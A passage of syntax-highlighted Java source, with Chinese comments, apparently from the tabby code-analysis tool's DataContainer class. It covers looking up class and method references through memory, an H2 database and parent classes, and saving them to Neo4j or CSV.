punctuation">(</span><span class="token class-name">Extend</span><span class="token punctuation">)</span> ref<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ref <span class="token keyword">instanceof</span> <span class="token class-name">Alias</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            savedAliasNodes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Alias</span><span class="token punctuation">)</span> ref<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 获取通过类名查找class节点     * 优先在内存找，没有的话往数据库找     * @param name     * @return     */</span>    <span class="token keyword">public</span> <span class="token class-name">ClassReference</span> <span class="token function">getClassRefByName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ClassReference</span> ref <span class="token operator">=</span> savedClassRefs<span class="token punctuation">.</span><span class="token function">getOrDefault</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ref <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> ref<span class="token punctuation">;</span>        <span class="token comment">// find from h2</span>        ref <span class="token operator">=</span> classRefService<span class="token punctuation">.</span><span class="token function">getClassRefByName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ref<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 通过函数子签名和所属类 获取指定method节点     * 优先在内存找，没有的话往数据库找     * @param classname     * @param subSignature     * @return     */</span>    <span class="token keyword">public</span> <span class="token class-name">MethodReference</span> <span class="token function">getMethodRefBySubSignature</span><span class="token punctuation">(</span><span class="token class-name">String</span> classname<span class="token punctuation">,</span> <span class="token class-name">String</span> subSignature<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> signature <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"&lt;%s: %s>"</span><span class="token punctuation">,</span> <span class="token function">clean</span><span class="token punctuation">(</span>classname<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">clean</span><span class="token punctuation">(</span>subSignature<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">MethodReference</span> ref <span class="token operator">=</span> savedMethodRefs<span class="token punctuation">.</span><span class="token function">getOrDefault</span><span class="token punctuation">(</span>signature<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ref <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> ref<span class="token punctuation">;</span>        <span class="token comment">// find from h2</span>        ref <span class="token operator">=</span> methodRefService<span class="token punctuation">.</span><span class="token function">getMethodRefBySignature</span><span class="token punctuation">(</span>signature<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ref<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">clean</span><span class="token punctuation">(</span><span class="token class-name">String</span> data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> data<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 通过函数全签名找指定的method节点     * 优先从内存找，没有的话往数据库找     * 不递归从父节点找     * @param signature     * @return     */</span>    <span class="token keyword">public</span> <span class="token class-name">MethodReference</span> <span class="token function">getMethodRefBySignature</span><span class="token punctuation">(</span><span class="token class-name">String</span> signature<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">MethodReference</span> ref <span class="token operator">=</span> savedMethodRefs<span class="token punctuation">.</span><span class="token function">getOrDefault</span><span class="token punctuation">(</span>signature<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ref <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> ref<span class="token punctuation">;</span>        <span class="token comment">// find from h2</span>        ref <span class="token operator">=</span> methodRefService<span class="token punctuation">.</span><span class="token function">getMethodRefBySignature</span><span class="token punctuation">(</span>signature<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ref<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 当前函数解决soot调用函数不准确的问题     * soot的invoke表达式会将父类、接口等函数都归宿到当前类函数上，导致无法找到相应的methodRef（这是因为父类未重载函数，内容将再父类上）     * 解决这个问题，通过往父类、接口找相应的内容     * 这里找到的是第一个找到的函数     * @param sootMethodRef     * @return     */</span>    <span class="token keyword">public</span> <span class="token class-name">MethodReference</span> <span class="token function">getMethodRefBySignature</span><span class="token punctuation">(</span><span class="token class-name">SootMethodRef</span> sootMethodRef<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">SootClass</span> cls <span class="token operator">=</span> sootMethodRef<span class="token punctuation">.</span><span class="token function">getDeclaringClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> subSignature <span class="token operator">=</span> sootMethodRef<span class="token punctuation">.</span><span class="token function">getSubSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">MethodReference</span> target                <span class="token operator">=</span> <span class="token function">getMethodRefBySubSignature</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> subSignature<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>target <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// 当前对象就能找到</span>            <span class="token keyword">return</span> target<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 如果找不到，可能因为soot的问题，所以向父类继续查找</span>        <span class="token keyword">return</span> <span class="token function">getFirstMethodRefFromFatherNodes</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> subSignature<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 跟tabby.core.container.DataContainer#getMethodRefBySignature(java.lang.String)一样     * 但是会递归找父节点     * @param classname     * @param subSignature     * @return     */</span>    <span class="token keyword">public</span> <span class="token class-name">MethodReference</span> <span class="token function">getMethodRefBySignature</span><span class="token punctuation">(</span><span class="token class-name">String</span> classname<span class="token punctuation">,</span> <span class="token class-name">String</span> subSignature<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">try</span><span class="token punctuation">&#123;</span> <span class="token comment">// getSootClass</span>            <span class="token class-name">SootClass</span> cls <span class="token operator">=</span> <span class="token class-name">SemanticHelper</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>classname<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span><span class="token punctuation">&#123;</span>                <span class="token class-name">SootMethod</span> method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>subSignature<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>method <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token function">getMethodRefBySignature</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">makeRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token comment">// soot 不会有父类函数的继承，所以这里需要往父类去查找</span>                <span class="token comment">// 也意味着当前对象没有重载父类函数，所以会报错找不到</span>                <span class="token keyword">return</span> <span class="token function">getFirstMethodRefFromFatherNodes</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> subSignature<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 获取SootClass报错</span>            <span class="token comment">// 忽略</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 对于找不到的methodref     * 1. 新建classRef 如果不存在的话     * 2. 从classRef找methodRef     * 3. 如果还是找不到则新建     * @param sootMethodRef     * @return     */</span>    <span class="token keyword">public</span> <span class="token class-name">MethodReference</span> <span class="token function">getOrAddMethodRef</span><span class="token punctuation">(</span><span class="token class-name">SootMethodRef</span> sootMethodRef<span class="token punctuation">,</span> <span class="token class-name">SootMethod</span> method<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 递归查找父节点</span>        <span class="token class-name">MethodReference</span> methodRef <span class="token operator">=</span> <span class="token function">getMethodRefBySignature</span><span class="token punctuation">(</span>sootMethodRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>methodRef <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 解决ClassInfoScanner阶段，函数信息收集不完全的问题</span>            <span class="token class-name">SootClass</span> cls <span class="token operator">=</span> sootMethodRef<span class="token punctuation">.</span><span class="token function">getDeclaringClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ClassReference</span> classRef <span class="token operator">=</span> <span class="token function">getClassRefByName</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>classRef <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// 对于新建的情况，再查一遍</span>                classRef <span class="token operator">=</span> <span class="token class-name">ClassInfoScanner</span><span class="token punctuation">.</span><span class="token function">collect0</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cls<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                methodRef <span class="token operator">=</span> <span class="token function">getMethodRefBySignature</span><span class="token punctuation">(</span>sootMethodRef<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>methodRef <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                methodRef <span class="token operator">=</span> <span class="token class-name">MethodReference</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>classRef<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Has</span> has <span class="token operator">=</span> <span class="token class-name">Has</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>classRef<span class="token punctuation">,</span> methodRef<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>classRef<span class="token punctuation">.</span><span class="token function">getHasEdge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>has<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    classRef<span class="token punctuation">.</span><span class="token function">getHasEdge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>has<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">store</span><span class="token punctuation">(</span>has<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">ClassInfoScanner</span><span class="token punctuation">.</span><span class="token function">makeAliasRelation</span><span class="token punctuation">(</span>has<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token function">store</span><span class="token punctuation">(</span>methodRef<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> methodRef<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 该方法首先尝试使用 getMethodRefBySubSignature() 方法从内存中或数据库中获取指定类和子签名的 methodRef。如果获取到了，则直接返回该 methodRef。</span>    <span class="token comment">// 如果获取不到，则该方法会检查指定类是否有父类。如果有父类，则该方法会递归调用 getFirstMethodRef() 方法，从父类中获取指定子签名的第一个 methodRef。</span>    <span class="token keyword">public</span> <span class="token class-name">MethodReference</span> <span class="token function">getFirstMethodRef</span><span class="token punctuation">(</span><span class="token class-name">String</span> classname<span class="token punctuation">,</span> <span class="token class-name">String</span> subSignature<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">MethodReference</span> target <span class="token operator">=</span> <span class="token function">getMethodRefBySubSignature</span><span class="token punctuation">(</span>classname<span class="token punctuation">,</span> subSignature<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>target <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> target<span class="token punctuation">;</span>        <span class="token class-name">SootClass</span> sc <span class="token operator">=</span> <span class="token class-name">SemanticHelper</span><span class="token punctuation">.</span><span class="token function">getSootClass</span><span class="token punctuation">(</span><span class="token function">clean</span><span class="token punctuation">(</span>classname<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>sc <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> sc<span class="token punctuation">.</span><span class="token function">hasSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            target <span class="token operator">=</span> <span class="token function">getFirstMethodRef</span><span class="token punctuation">(</span>sc<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> subSignature<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> target<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 根据Java语法，遇到第一个父类函数存在对应subSignature的函数是真实函数     * 所以默认以广度优先进行查找，但也可指定深度优先     * @param cls     * @param subSignature     * @return     */</span>    <span class="token comment">// 该方法从指定类的父类和接口中依次查找指定子签名的函数，直到找到第一个与指定子签名匹配的函数。如果没有找到，则返回 null。</span>    <span class="token keyword">public</span> <span class="token class-name">MethodReference</span> <span class="token function">getFirstMethodRefFromFatherNodes</span><span class="token punctuation">(</span><span class="token class-name">SootClass</span> cls<span class="token punctuation">,</span> <span class="token class-name">String</span> subSignature<span class="token punctuation">,</span> <span class="token keyword">boolean</span> deepFirst<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 父节点包括父类 和 接口</span>        <span class="token class-name">MethodReference</span> target <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token comment">// 从父类找</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">hasSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">SootClass</span> superCls <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            target <span class="token operator">=</span> <span class="token function">getTargetMethodRef</span><span class="token punctuation">(</span>superCls<span class="token punctuation">,</span> subSignature<span class="token punctuation">,</span> deepFirst<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>target <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> target<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 从接口找</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getInterfaceCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">SootClass</span> intface<span class="token operator">:</span>cls<span class="token punctuation">.</span><span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                target <span class="token operator">=</span> <span class="token function">getTargetMethodRef</span><span class="token punctuation">(</span>intface<span class="token punctuation">,</span> subSignature<span class="token punctuation">,</span> deepFirst<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>target <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> target<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 该方法首先获取指定类的父类和接口。然后，该方法遍历 classes 对象，为每个类查找与指定子签名匹配的函数。如果找到，则将该函数添加到 refs 对象中。如果没有找到，则递归调用 getAliasMethodRefs() 方法，从该类的父类和接口中查找与指定子签名匹配的函数。</span>    <span class="token keyword">public</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">MethodReference</span><span class="token punctuation">></span></span> <span class="token function">getAliasMethodRefs</span><span class="token punctuation">(</span><span class="token class-name">SootClass</span> cls<span class="token punctuation">,</span> <span class="token class-name">String</span> subSignature<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">MethodReference</span><span class="token punctuation">></span></span> refs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SootClass</span><span class="token punctuation">></span></span> classes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">hasSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            classes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getInterfaceCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            classes<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">MethodReference</span> ref <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">SootClass</span> clazz<span class="token operator">:</span>classes<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            ref <span class="token operator">=</span> <span class="token function">getMethodRefBySubSignature</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> subSignature<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>ref <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                refs<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                refs<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span><span class="token function">getAliasMethodRefs</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span> subSignature<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> refs<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 该方法首先判断 deepFirst 的值。如果为 true，则表示以深度优先的方式进行查找。该方法首先从指定类的父类和接口中查找第一个与指定子签名匹配的函数。如果没有找到，则从指定类中查找与指定子签名匹配的函数。</span>    <span class="token comment">// 如果 deepFirst 的值为 false，则表示以广度优先的方式进行查找。该方法首先从指定类中查找与指定子签名匹配的函数。如果没有找到，则从指定类的父类和接口中查找第一个与指定子签名匹配的函数</span>    <span class="token keyword">private</span> <span class="token class-name">MethodReference</span> <span class="token function">getTargetMethodRef</span><span class="token punctuation">(</span><span class="token class-name">SootClass</span> cls<span class="token punctuation">,</span> <span class="token class-name">String</span> subSignature<span class="token punctuation">,</span> <span class="token keyword">boolean</span> deepFirst<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">MethodReference</span> target <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>deepFirst<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            target <span class="token operator">=</span> <span class="token function">getFirstMethodRefFromFatherNodes</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> subSignature<span class="token punctuation">,</span> deepFirst<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>target <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                target <span class="token operator">=</span> <span class="token function">getMethodRefBySubSignature</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> subSignature<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            target <span class="token operator">=</span> <span class="token function">getMethodRefBySubSignature</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> subSignature<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>target <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                target <span class="token operator">=</span> <span class="token function">getFirstMethodRefFromFatherNodes</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> subSignature<span class="token punctuation">,</span> deepFirst<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> target<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 该方法首先调用 methodRefService 对象的 loadNecessaryMethodRefs() 方法，获取必要的函数引用列表。然后，该方法遍历 refs 列表，将每个函数引用的签名作为键，将函数引用本身作为值，保存到 savedMethodRefs 对象中</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">loadNecessaryMethodRefs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">MethodReference</span><span class="token punctuation">></span></span> refs <span class="token operator">=</span> methodRefService<span class="token punctuation">.</span><span class="token function">loadNecessaryMethodRefs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        refs<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>ref <span class="token operator">-></span><span class="token punctuation">&#123;</span>            savedMethodRefs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>ref<span class="token punctuation">.</span><span class="token function">getSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ref<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">loadNecessaryClassRefs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ClassReference</span><span class="token punctuation">></span></span> refs <span class="token operator">=</span> classRefService<span class="token punctuation">.</span><span class="token function">loadNecessaryClassRefs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        refs<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>ref <span class="token operator">-></span><span class="token punctuation">&#123;</span>            savedClassRefs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>ref<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ref<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 这段代码首先记录日志，表示将要将数据保存到 Neo4j。然后，它调用 methodService 对象的 importMethodRef() 方法，将方法引用保存到 Neo4j。接下来，它调用 classService 对象的 importClassRef() 方法，将类引用保存到 Neo4j。最后，它调用 classService 对象的 buildEdge() 方法，将类之间的关系保存到 Neo4j。</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save2Neo4j</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Save methods to Neo4j."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        methodService<span class="token punctuation">.</span><span class="token function">importMethodRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Save classes to Neo4j."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        classService<span class="token punctuation">.</span><span class="token function">importClassRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Save relation to Neo4j."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        classService<span class="token punctuation">.</span><span class="token function">buildEdge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 这段代码首先记录日志，表示将要将数据保存到 CSV 文件。然后，它调用 classRefService 对象的 save2Csv() 方法，将类引用保存到 CSV 